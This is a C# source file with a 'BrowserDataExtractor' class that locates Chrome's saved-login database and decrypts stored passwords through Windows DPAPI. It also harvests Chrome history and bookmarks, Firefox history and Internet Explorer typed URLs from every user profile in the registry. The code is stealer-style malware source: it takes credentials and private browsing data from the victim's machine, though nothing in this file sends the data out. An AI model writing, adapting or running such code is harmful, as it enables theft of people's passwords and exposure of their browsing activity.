using System;
using System.IO;
using System.Text;
using System.Text.RegularExpressions;
using System.Collections.Generic;
using System.Linq;
using Microsoft.Win32;
using System.Security.Cryptography;

namespace TP
{
    public class BrowserDataExtractor : DataExtractor
    {

        public BrowserDataExtractor()
        {
            fileName = "chromeData";
        }

        protected override string ExtractData()
        {
            Tuple<List<string>, List<string>> chromeUserPassword = GetChromeUserPassword();
            List<string> chromeHistory = GetChromeHistory();
            List<string> chromeBookmarks = GetChromeBookmarks();
            List<string> firefoxHistory = GetFirefoxHistory();
            List<string> ieHistory = GetIEHistory();

            return "";
        }

        private List<string> GetIEHistory()
        {
            var localKey = RegistryKey.OpenBaseKey(RegistryHive.Users, Environment.Is64BitOperatingSystem ? RegistryView.Registry64 : RegistryView.Registry32);
            string pattern = @"S-1-5-21-[0-9]+-[0-9]+-[0-9]+-[0-9]+$";
            string[] subKeys = localKey.GetSubKeyNames();
            List<string> pathes = new List<string>();
            foreach (string sk in subKeys)
            {
                if (Regex.IsMatch(sk, pattern))
                {
                    pathes.Add(sk);
                }
            }

            List<string> history = new List<string>();
            foreach (string path in pathes)
            {

                var subKey = localKey.OpenSubKey(path + @"\Software\Microsoft\Internet Explorer\TypedURLs");
                string[] registryKeyValue = subKey?.GetValueNames();

                foreach (string key in registryKeyValue)
                {
                    var val = subKey?.GetValue(key);
                    history.Add(val.ToString());
                }

            }
            return history;
        }

        private List<string> GetChromeHistory()
        {
            var filePath = @"%USERPROFILE%\AppData\Local\Google\Chrome\User Data\Default\History";
            string pattern = @"(htt(p|s)://([\w-]+\.)+[\w-]+[\w- ./?%&=]*)*";
            string binaryText = ReadFilePath(filePath, Encoding.Default);

            if (binaryText == null)
                return null;

            Regex historyRegex = new Regex(pattern);
            var historyMatches = historyRegex.Matches(binaryText).OfType<Match>().Select(m => m.Groups[0].Value).Distinct();
            List<string> history = new List<string>();

            foreach (var his in historyMatches)
            {
                history.Add(his);
            }

            return history;
        }

        private List<string> GetChromeBookmarks()
        {
            var filePath = @"%USERPROFILE%\AppData\Local\Google\Chrome\User Data\Default\Bookmarks";
            string jsonText = ReadFilePath(filePath, Encoding.Default);
            List<string> jsons = new List<string>(1);
            jsons.Add(jsonText);
            if (jsonText == null)
                return null;

            return jsons;
        }



        private Tuple<List<string>, List<string>> GetChromeUserPassword()
        {
            var pathWithEnv = @"%USERPROFILE%\AppData\Local\Google\Chrome\User Data\Default\Login Data";
            Encoding encoding = Encoding.GetEncoding(28591);

            string binaryText = ReadFilePath(pathWithEnv, encoding);

            if (binaryText == null)
                return null;

            List<string> decPwdArray = ExtractPassword(encoding, binaryText);
            List<string> usr = ExtractUser(encoding, binaryText);

            return new Tuple<List<string>, List<string>>(usr, decPwdArray);
        }

        private static List<string> GetFirefoxHistory()
        {
            var pathWithEnv = @"%USERPROFILE%\AppData\Roaming\Mozilla\Firefox\Profiles\";
            var filePath = Environment.ExpandEnvironmentVariables(pathWithEnv);

            if (!Directory.Exists(filePath))
                return null;
            
            string fxHistory = Directory.GetDirectories(filePath, "*.*").Where(s => s.EndsWith(".default")).ToList().Last();
            string pattern = @"(htt(p|s))://([\w-]+\.)+[\w-]+(/[\w- ./?%&=]*)*?";
            Regex firefoxHistory = new Regex(pattern);
            string historyFile = ReadFilePath(fxHistory + "\\places.sqlite", Encoding.Default);
            
            Regex histRegex = new Regex(pattern);
            var histMatches = histRegex.Matches(historyFile).OfType<Match>().Select(m => m.Groups[0].Value).Distinct();
            List<string> history = new List<string>();
            foreach (var his in histMatches)
            {
                history.Add(his);
            }

            return history;
        }

        private static List<string> ExtractUser(Encoding encoding, string binaryText)
        {
            string pattern = @"(ht|f)tp(s?)\:\/\/[0-9a-zA-Z]([-.\w]*[0-9a-zA-Z])*(\/?)";
            Regex userRegex = new Regex(pattern);
            var usrMatches = userRegex.Matches(binaryText).OfType<Match>().Select(m => m.Groups[0].Value).Distinct();
            List<string> usr = new List<string>();

            foreach (var user in usrMatches)
            {
                var usrEncoded = encoding.GetBytes(user.ToString());
                var decPwd = Encoding.Default.GetString(usrEncoded);
                usr.Add(decPwd);
            }

            return usr;
        }

        private static List<string> ExtractPassword(Encoding encoding, string binaryText)
        {
            string pattern = @"(\x01\x00\x00\x00\xD0\x8C\x9D\xDF\x01\x15\xD1\x11\x8C\x7A\x00\xC0\x4F\xC2\x97\xEB\x01\x00\x00\x00)[\s\S]*?(?=\x68\x74\x74\x70|\Z)";
            Regex pwdRegex = new Regex(pattern);
            var pwdMatches = pwdRegex.Matches(binaryText).OfType<Match>().Select(m => m.Groups[0].Value).Distinct();
            List<string> decPwdArray = new List<string>();

            foreach (var pwd in pwdMatches)
            {
                var pwdEncoded = encoding.GetBytes(pwd.ToString());
                var decrypt = ProtectedData.Unprotect(pwdEncoded, null, DataProtectionScope.CurrentUser);
                var decPwd = Encoding.Default.GetString(decrypt);
                decPwdArray.Add(decPwd);
            }

            return decPwdArray;
        }

        private static string ReadFilePath(string pathWithEnv, Encoding encoding)
        {
            var filePath = Environment.ExpandEnvironmentVariables(pathWithEnv);
            if (filePath == null)
                return null;
            FileStream fs = File.Open(filePath, FileMode.OpenOrCreate, FileAccess.ReadWrite, FileShare.None);
            StreamReader streamReader = new StreamReader(fs, encoding);
            string binaryText = streamReader.ReadToEnd();
            streamReader.Close();
            fs.Close();

            return binaryText;
        }
    }
}
